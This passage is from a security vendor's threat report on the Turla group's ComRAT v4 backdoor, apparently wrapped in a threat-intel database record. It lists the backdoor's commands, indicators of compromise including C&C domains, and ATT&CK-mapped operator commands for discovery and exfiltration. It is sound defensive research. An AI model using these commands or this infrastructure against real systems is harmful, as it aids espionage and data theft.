25 is an example of an email created by ComRAT.\n\nFigure 25 // Email sent by ComRAT to the operators’ email address (partially redacted and opened\n\nin Microsoft Outlook for demonstration purposes only)\n\n##### 4.6 Backdoor commands\n\nThe operators can send commands using either of the C&C channels. The backdoor will receive\nthe command ID and the arguments, if any.\n\nAs seen in Table 1, the commands implemented in ComRAT v4 are not surprising and allow control of almost\neverything on the machine: manage files, execute additional processes or gather logs.\n\n\nTable 1 _List of backdoor commands in ComRAT v4_\n\n\nID Name Description\n\n0x65 WriteFile Write in a file\n\n0x66 ReadFile Read a file\n\n0x67 ShellExecute Execute a command with cmd.exe\n\n0x68 SetTimeout Set the timeout for the C&C channel\n\nAdd an address in /etc/transport/legacy/get.list\n0x69 AddAddress\nor in /etc/transport/legacy/post.list\n\n0x6a SendWorkingLog Send /var/log/working.c4log\n\n0x6b InvokeBinFromMem Load a PE from memory using an internal PE loader\n\n0x6c InvokeBinFromFS Load a PE from file using an internal PE loader\n\nDelete an address from /etc/transport/legacy/get.list\n0x6d DeleteAddress\nor /etc/transport/legacy/post.list\n\n0x6e GetConfiguration Get the configuration\n\n0x6f DirStg List a directory in the Virtual File System\n\n0x70 RunExe Execute a PE with CreateProcessW\n\nInvoke a PowerShell script from memory using\n0x71 InvokePSFromMem\na PowerShell runner\n\nInvoke a PowerShell script from a file using\n0x72 InvokePSFromFS\na PowerShell runner\n\nDelete the messages in the Gmail mailbox (added in the most\n0x73 DeleteAllMail\nrecent version, first seen around November 2019)\n\n\n-----\n\n#### 5. CONCLUSION\n\nVersion four of ComRAT is a totally revamped malware family released in 2017. Its developers took\ninspiration from other Turla backdoors, such as Snake, to build a very complex piece of malware.\n\nIts most interesting features are the Virtual File System in FAT16 format and the ability to use the Gmail\nweb UI to receive commands and exfiltrate data. Thus, it is able to bypass some security controls because\nit doesn’t rely on any malicious domain. We also noticed that this new version abandoned the use\nof COM object hijacking for persistence, the method that gave the malware its common name.\n\nWe found indications that ComRAT v4 was still in use at the beginning of 2020, showing that the Turla\ngroup is still very active and a major threat for diplomats and militaries.\n\nWe will continue to monitor Turla developments to help defenders protect their networks.\n\n[Indicators of Compromise can also be found on GitHub. For any inquiries, or to make sample](https://github.com/eset/malware-ioc/tree/master/turla#turla-comrat-v4-indicators-of-compromise)\n[submissions related to the subject, contact us at: threatintel@eset.com.](mailto:threatintel@eset.com)\n\n\n-----\n\n#### 6. BIBLIOGRAPHY\n\n1 Yle. (2016, 01 13). Russian group behind 2013 Foreign Ministry hack. Retrieved from\n_[https://yle.fi/uutiset/osasto/news/russian_group_behind_2013_foreign_ministry_hack/8591548](https://yle.fi/uutiset/osasto/news/russian_group_behind_2013_foreign_ministry_hack/8591548)_\n\n2 Boutin, J.-I. (2017, 06 06). Turla’s watering hole campaign: An updated Firefox\n[extension abusing Instagram. Retrieved from https://www.welivesecurity.com/2017/06/06/](https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/)\n_[turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/](https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/)_\n\n3 Cherepanov, A. (2017, 06 30). TeleBots are back: Supply-chain attacks against Ukraine. (ESET) Retrieved from\n_[https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/](https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/)_\n\n4 Cherepanov, A. (2018, 10). GREYENERGY: A successor to BlackEnergy. (ESET) Retrieved from\n_[https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf](https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf)_\n\n5 Corfield, G. (2020, 02 14). Austrian foreign ministry: ‘State actor’ hack on government IT systems is over.\n[Retrieved from https://www.theregister.co.uk/2020/02/14/austria_foreign_ministry_hack_turla_group_allegs/](https://www.theregister.co.uk/2020/02/14/austria_foreign_ministry_hack_turla_group_allegs/)\n\n6 ESET. (2018, 08). Turla Outlook Backdoor. Retrieved from\n_[https://www.welivesecurity.com/wp-content/uploads/2018/08/Eset-Turla-Outlook-Backdoor.pdf](https://www.welivesecurity.com/wp-content/uploads/2018/08/Eset-Turla-Outlook-Backdoor.pdf)_\n\n7 ESET Research. (2017, 03 30). Carbon Paper: Peering into Turla’s second stage backdoor. (ESET) Retrieved from\n_[https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/](https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/)_\n\n8 ESET Research. (2017, 08). Gazing at Gazer - Turla’s new second stage backdoor. (ESET) Retrieved from\n_[https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf](https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf)_\n\n9 ESET Research. (2018, 01). Diplomats in Eastern Europe bitten by a Turla mosquito. (ESET) Retrieved from\n_[https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf](https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf)_\n\n10 ESET Research. (2018, 05 22). Turla Mosquito: A shift towards more generic tools. Retrieved from\n_[https://www.welivesecurity.com/2018/05/22/turla-mosquito-shift-towards-generic-tools/](https://www.welivesecurity.com/2018/05/22/turla-mosquito-shift-towards-generic-tools/)_\n\n11 Faou, M. (2019, 05). Turla LightNeuron. Retrieved from\n_[https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf](https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf)_\n\n12 Faou, M. (2020, 03 12). Tracking Turla: New backdoor delivered via Armenian watering holes. Retrieved from\n_[https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/](https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/)_\n\n13 Faou, M., & Dumont, R. (2019, 05 29). A dive into Turla PowerShell usage. Retrieved from\n_[https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/)_\n\n14 G DATA. (2014, 03 07). Uroburos – Deeper travel into kernel protection mitigation. Retrieved from\n_[https://www.gdatasoftware.com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation](https://www.gdatasoftware.com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation)_\n\n15 G DATA. (2015, 01 15). Evolution of sophisticated spyware: from Agent.BTZ to ComRAT. Retrieved from\n_[https://www.gdatasoftware.com/blog/2015/01/23927-evolution-of-sophisticated-spyware-from-agent-btz-to-comrat](https://www.gdatasoftware.com/blog/2015/01/23927-evolution-of-sophisticated-spyware-from-agent-btz-to-comrat)_\n\n16 Huss, D. (2017, 08 17). Turla APT actor refreshes KopiLuwak JavaScript backdoor for use\n[in G20-themed attack. Retrieved from https://www.proofpoint.com/us/threat-insight/post/](https://www.proofpoint.com/us/threat-insight/post/turla-apt-actor-refreshes-kopiluwak-javascript-backdoor-use-g20-themed-attack)\n_[turla-apt-actor-refreshes-kopiluwak-javascript-backdoor-use-g20-themed-attack](https://www.proofpoint.com/us/threat-insight/post/turla-apt-actor-refreshes-kopiluwak-javascript-backdoor-use-g20-themed-attack)_\n\n17 Kaspersky GReAT. (2018, 10 04). Shedding Skin - Turla’s Fresh Faces. Retrieved from\n_[https://securelist.com/shedding-skin-turlas-fresh-faces/88069/](https://securelist.com/shedding-skin-turlas-fresh-faces/88069/)_\n\n18 KNOWLTON, B. (2010, 08 25). Military Computer Attack Confirmed. (New York Times) Retrieved 04 09, 2018,\n[from https://www.nytimes.com/2010/08/26/technology/26cyber.html](https://www.nytimes.com/2010/08/26/technology/26cyber.html)\n\n19 Managed Adversary and Threat Intelligence (MATI). (2019, 06 20). Waterbug:\nEspionage Group Rolls Out Brand-New Toolset in Attacks Against Governments. Retrieved from\n_[https://symantec-blogs.broadcom.com/blogs/threat-intelligence/waterbug-espionage-governments](https://symantec-blogs.broadcom.com/blogs/threat-intelligence/waterbug-espionage-governments)_\n\n20 MELANI. (2016, 05 23). Technical Report about the Malware used in the Cyberespionage against RUAG.\n[Retrieved from https://www.melani.admin.ch/melani/en/home/dokumentation/reports/technical-reports/](https://www.melani.admin.ch/melani/en/home/dokumentation/reports/technical-reports/technical-report_apt_case_ruag.html)\n_[technical-report_apt_case_ruag.html](https://www.melani.admin.ch/melani/en/home/dokumentation/reports/technical-reports/technical-report_apt_case_ruag.html)_\n\n\n-----\n\n21 National Cyber Security Centre. (2017, 11 23). Turla group using Neuron and Nautilus tools alongside\n[Snake malware. Retrieved from https://www.ncsc.gov.uk/static-assets/documents/Turla%20group%20using](https://www.ncsc.gov.uk/static-assets/documents/Turla%20group%20using%20Neuron%20and%20Nautilus%20tools%20alongside%20Snake%20malware_1.pdf)\n_[%20Neuron%20and%20Nautilus%20tools%20alongside%20Snake%20malware_1.pdf](https://www.ncsc.gov.uk/static-assets/documents/Turla%20group%20using%20Neuron%20and%20Nautilus%20tools%20alongside%20Snake%20malware_1.pdf)_\n\n22 Schlee, M. (2018, 03 06). Hackers used Outlook for cyberattack on German government: report. Retrieved\n[from https://www.politico.eu/article/report-hackers-used-outlook-for-cyberattack-on-german-government/](https://www.politico.eu/article/report-hackers-used-outlook-for-cyberattack-on-german-government/)\n\n23 Shevchenko, S. (2008, 11). Agent.btz - A Threat That Hit Pentagon. Retrieved from\n_[http://blog.threatexpert.com/2008/11/agentbtz-threat-that-hit-pentagon.html](http://blog.threatexpert.com/2008/11/agentbtz-threat-that-hit-pentagon.html)_\n\n24 Tanase, S. (2015, 09 09). Satellite Turla: APT Command and Control in the Sky. Retrieved from\n_[https://securelist.com/satellite-turla-apt-command-and-control-in-the-sky/72081/](https://securelist.com/satellite-turla-apt-command-and-control-in-the-sky/72081/)_\n\n25 Untersinger, M. (2019, 01 29). Quelle est la bonne équation pour pacifier le cyberespace ? (Le Monde2019)\nRetrieved from\n_[https://www.lemonde.fr/pixels/article/2019/01/29/course-aux-cyberarmes-logiciels-destructeurs-dormants-le-difficile-](https://www.lemonde.fr/pixels/article/2019/01/29/course-aux-cyberarmes-logiciels-destructeurs-dormants-le-difficile-apaisement-du-cyberespace_5416003_4408996.html)_\n_[apaisement-du-cyberespace_5416003_4408996.html](https://www.lemonde.fr/pixels/article/2019/01/29/course-aux-cyberarmes-logiciels-destructeurs-dormants-le-difficile-apaisement-du-cyberespace_5416003_4408996.html)_\n\n26 Wikipedia. (n.d.). Abstract factory pattern. Retrieved 03 17, 2020, from\n_[https://en.wikipedia.org/wiki/Abstract_factory_pattern](https://en.wikipedia.org/wiki/Abstract_factory_pattern)_\n\n27 Wikipedia. (n.d.). Adapter pattern. Retrieved 03 17, 2020, from\n_[https://en.wikipedia.org/wiki/Adapter_pattern](https://en.wikipedia.org/wiki/Adapter_pattern)_\n\n28 Wikipedia. (n.d.). Mediator pattern. Retrieved 03 17, 2020, from\n_[https://en.wikipedia.org/wiki/Mediator_pattern](https://en.wikipedia.org/wiki/Mediator_pattern)_\n\n\n-----\n\n#### 7. INDICATORS OF COMPROMISE\n\n##### 7.1 Hashes\n\nSHA-1 Description ESET detection name\n\n4D8B1F4ACC638080054FFBB4CEF2559583A22DC6 PowerShell dropper PowerShell/Turla.X\n\nDD7006D16D8E121FCE8F2905433474ECCED75CC0 ComRAT orchestrator Win64/Turla.BY\n\n0139818441431C72A1935E7F740A1CC458A63452 ComRAT orchestrator Win64/Turla.AP\n\n0AB87F7BDF7D9E54BA33FE715C11E275D5DCCE15 ComRAT orchestrator Win32/Turla.EI\n\n##### 7.2 Paths\n\n%TEMP%\\FXSAPIDebugTrace.txt\n\n%TEMP%\\iecache.bin\n\n##### 7.3 Windows registry\n```\n  (HKLM|HKCU)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\\n\n```\n{59031A47-3F72-44A7-80C5-5595FE6B30EE}\n\nHKLM\\SOFTWARE\\Microsoft\\SQMClient\\Windows.WSqmCons\n\n##### 7.4 Network\n\narinas[.]tk\n\nbedrost[.]com\n\nbranter[.]tk\n\nbronerg[.]tk\n\ncelestyna[.]tk\n\ncrusider[.]tk\n\ndavilta[.]tk\n\ndeme[.]ml\n\ndixito[.]ml\n\nduke6[.]tk\n\nelizabi[.]tk\n\nfoods.jkub[.]com\n\nhofa[.]tk\n\nhunvin[.]tk\n\nlakify[.]ml\n\nlindaztert[.]net\n\nmisters[.]ml\n\npewyth[.]ga\n\nprogress.zyns[.]com\n\nsameera[.]gq\n\nsanitar[.]ml\n\nscrabble.ikwb[.]com\n\nsumefu[.]gq\n\numefu[.]gq\n\nvefogy[.]cf\n\nvylys[.]com\n\nwekanda[.]tk\n\n\n-----\n\n#### 8. MITRE ATT&CK TECHNIQUES\n\nTactic ID Name Description\n\nExecution _[T1086](https://attack.mitre.org/techniques/T1086/)_ PowerShell A PowerShell script is used to install ComRAT.\n\nComRAT uses a scheduled task to launch\nPersistence _[T1053](https://attack.mitre.org/techniques/T1053/)_ Scheduled Task\nits PowerShell loader.\n\n\nThe ComRAT orchestrator is stored encrypted\nand only decrypted at execution.\n\nThe ComRAT orchestrator is injected into explorer.exe.\nThe communication DLL is injected into\nthe default browser.\n\n\nDefense\nEvasion\n\nDiscovery\n\n\nObfuscated Files\n_[T1027](https://attack.mitre.org/techniques/T1027/)_\nor Information\n\n_[T1055](https://attack.mitre.org/techniques/T1055/)_ Process Injection\n\n\nThe ComRAT orchestrator is stored encrypted\n_[T1112](https://attack.mitre.org/techniques/T1112/)_ Modify Registry\nin the registry.\n\nSystem Network\n_[T1016](https://attack.mitre.org/techniques/T1016/)_ Operators execute ipconfig and nbstat.\nConfiguration Discovery\n\nSystem Owner/User\n_[T1033](https://attack.mitre.org/techniques/T1033/)_ Operators execute net user.\nDiscovery\n\n_[T1069](https://attack.mitre.org/techniques/T1069/)_ Permission Groups Discovery Operators execute net group /domain.\n\nSystem Information\n_[T1082](https://attack.mitre.org/techniques/T1082/)_ Operators execute systeminfo.\nDiscovery\n\n\n_[T1083](https://attack.mitre.org/techniques/T1083/)_ File and Directory Discovery\n\n\nOperators list the content of several directories.\nExample: dir /og-d “%userprofile%\\AppData\\\nRoaming\\Microsoft\\Windows\\Recent\\*.*”.\n\n\n_[T1087](https://attack.mitre.org/techniques/T1087/)_ Account Discovery Operators execute net user and net group.\n\nOperators execute fsutil fsinfo drives\n_[T1120](https://attack.mitre.org/techniques/T1120/)_ Peripheral Device Discovery\nto list the connected drives.\n\n_[T1135](https://attack.mitre.org/techniques/T1135/)_ Network Share Discovery Operators execute net view.\n\n\nData from Information\nCollection _[T1213](https://attack.mitre.org/techniques/T1213/)_\nRepositories\n\n\nThe Operators use a custom tool to exfiltrate documents\nfrom an internal central database.\n\n\nCommand and\nControl\n\nExfiltration\n\n\nCustom Cryptographic\n_[T1024](https://attack.mitre.org/techniques/T1024/)_ ComRAT uses RSA and AES to encrypt C&C data.\nProtocol\n\n_[T1043](https://attack.mitre.org/techniques/T1043/)_ Commonly Used Port ComRAT uses ports 80 and 443.\n\nStandard Application\n_[T1071](https://attack.mitre.org/techniques/T1071/)_ ComRAT uses HTTP and HTTPS.\nLayer Protocol\n\n_[T1102](https://attack.mitre.org/techniques/T1102/)_ Web Service ComRAT can be controlled via the Gmail web UI.\n\n_[T1002](https://attack.mitre.org/techniques/T1002/)_ Data Compressed The documents are compressed in a RAR archive.\n\n_[T1022](https://attack.mitre.org/techniques/T1022/)_ Data Encrypted The RAR archive is encrypted with a password.\n\n\nExfiltration Over\n_[T1048](https://attack.mitre.org/techniques/T1048/)_\nAlternative Protocol\n\n\nData is exfiltrated to cloud storage, mounted locally\nusing the net use command.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.05.26_From_Agent.BTZ_to_ComRAT/ESET_Turla_ComRAT.pdf"
    ],
    "report_names": [
        "ESET_Turla_ComRAT.pdf",
        "ESET_Turla_ComRAT"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "4d9cdc7f-72d6-4e17-89d8-f6323bfcaebb",
            "created_at": "2023-01-06T13:46:38.82716Z",
            "updated_at": "2025-03-27T02:00:02.928984Z",
            "deleted_at": null,
            "main_name": "GreyEnergy",
            "aliases": [],
            "source_name": "MISPGALAXY:GreyEnergy",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "39842197-944a-49fd-9bec-eafa1807e0ea",
            "created_at": "2022-10-25T16:07:24.310589Z",
            "updated_at": "2025-03-27T02:02:10.167471Z",
            "deleted_at": null,
            "main_name": "TeleBots",
            "aliases": [],
            "source_name": "ETDA:TeleBots",
            "tools": [
                "BadRabbit",
                "Black Energy",
                "BlackEnergy",
                "CredRaptor",
                "Diskcoder.C",
                "EternalPetya",
                "ExPetr",
                "Exaramel",
                "FakeTC",
                "Felixroot",
                "GreyEnergy",
                "GreyEnergy mini",
                "KillDisk",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "NonPetya",
                "NotPetya",
                "Nyetya",
                "Petna",
                "Petrwrap",
                "Pnyetya",
                "TeleBot",
                "TeleDoor",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "nPetya"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
